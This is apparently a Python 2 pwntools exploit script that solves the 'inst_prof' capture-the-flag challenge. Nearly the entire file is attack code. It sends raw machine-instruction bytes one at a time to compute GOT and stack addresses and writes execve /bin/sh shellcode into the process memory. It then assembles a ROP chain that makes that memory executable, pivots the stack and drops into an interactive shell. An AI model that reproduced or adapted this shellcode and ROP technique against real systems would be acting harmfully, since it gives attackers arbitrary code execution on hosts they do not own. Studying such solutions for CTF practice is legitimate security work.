#!/usr/bin/env python2

from pwn import *
from IPython import embed

ret = "\xc3"
nop = "\x90"

def writeByteString(str):
    mov_r15 = "\x41\xc6\x07"
    inc_r15 = "\x49\xff\xc7" + ret
    
    for byte in str:
        p.send(mov_r15 + byte)  # mov byte ptr [r15], {byte}
        p.send(inc_r15)         # inc r14    

p = process("./inst_prof")
# p = remote("inst-prof.ctfcompetition.com", 1337)


print(p.readline())

shellcode = (   
    "\x48\x31\xc0\x48\x89\xec\x50\x48"
    "\x89\xe2\x48\xbb\xff\x2f\x62\x69"
    "\x6e\x2f\x73\x68\x48\xc1\xeb\x08"
    "\x53\x48\x89\xe7\x50\x52\x48\x89"
    "\xe2\x50\x57\x48\x89\xe6\xb0\x3b"
    "\x0f\x05"
)

# now we get the return address (text section reference) into r13:
p.send("\x4c\x8b\x2c\x24")              # mov r13, [rsp]

# We need to get 0x2014e8 to add to r13
p.send("\x49\x83\xc7\x20")              # add r15, 0x20 -> r15 = 0x20 * 0x1000 -> 0x20000

for i in range(0x10):
    p.send("\x4d\x01\xfe" + ret)        # add r14, r15; r14 = 0x200000

for i in range(0x9D):
    p.send("\x4d\x01\xd6" + ret)        # add r14, r10; r14 = 0x2014da

for i in range(0xE):
    p.send("\x49\xff\xc6" + ret)        # inc r14; r14 = 0x2014e8 !!
    
p.send("\x4d\x01\xf5" + ret)            # add r13, r14; r13 = [rsp] + 0x2014e8 = GOT TABLE
p.send("\x4d\x89\xee" + ret)            # mov r14, r13; Counter
for i in range(0x70):
    p.send("\x49\xff\xc6" + ret)        #

p.send("\x4d\x89\xf7" + ret)            # r14 = r15 = 0x*******70

writeByteString(shellcode)
# r13 -> Addr GOT Table
# r14 -> Addr Shellcode
# r15 -> Addr End Shellcode

# 3) rsp + 24 -> ROP pop rdi + ret      # [rsp] + 
# 1) rsp + 32 -> GOT table address (r13)
# 2) rsp + 40 -> addr make executable
# rsp + 48 -> shellcode addr

# context.arch      = 'i386'
# context.os        = 'linux'
# context.endian    = 'little'
# context.word_size = 32
# context.log_level = 'debug'
# context(arch='arm', os='linux')

# 1) rsp + 32 -> GOT table address (r13)
p.send("\x49\x89\xe7" + ret)            # mov r15, rsp
for i in range(32):
    p.send("\x49\xff\xc7" + ret)        # inc r15
p.send("\x4d\x89\x2f" + ret)            # mov [r15], r13
# :> pxq 8 @ rsp+32
# 0x7ffde1355c48  0x000055664a259000                       ..%JfU..


# 2) rsp + 40 -> addr make executable
p.send("\x4c\x8b\x2c\x24")              # mov r13, [rsp]
p.send("\x49\x89\xe7" + ret)            # mov r15, rsp
for i in range(248):
    p.send("\x49\xff\xcd" + ret)        # dec r13    
for i in range(40):
    p.send("\x49\xff\xc7" + ret)        # inc r15
p.send("\x4d\x89\x2f" + ret)            # mov [r15], r13
# :> pxq 8 @ rsp+24
# 0x7ffde1355c40  0x000055664a057a20                        z.JfU..

# 3) rsp + 24 -> ROP pop rdi + ret
p.send("\x4c\x8b\x2c\x24")              # mov r13, [rsp]
p.send("\x49\x89\xe7" + ret)            # mov r15, rsp
for i in range(0xab):
    p.send("\x49\xff\xc5" + ret)        # inc r13
for i in range(24):
    p.send("\x49\xff\xc7" + ret)        # inc r15
p.send("\x4d\x89\x2f" + ret)            # mov [r15], r13
# :> pxq 8 @ rsp+24
# 0x7ffe34edf120  0x0000562f517c0bc3                       ..|Q/V..

p.send("\x49\x89\xe7" + ret)            # mov r15, rsp
for i in range(24):
    p.send("\x49\xff\xc7" + ret)        # inc r15

p.send("\x4c\x89\xfc" + ret)            # mov rsp, r15

p.send("\x4c\x89\x34\x24")              # move [rsp], r14

p.interactive()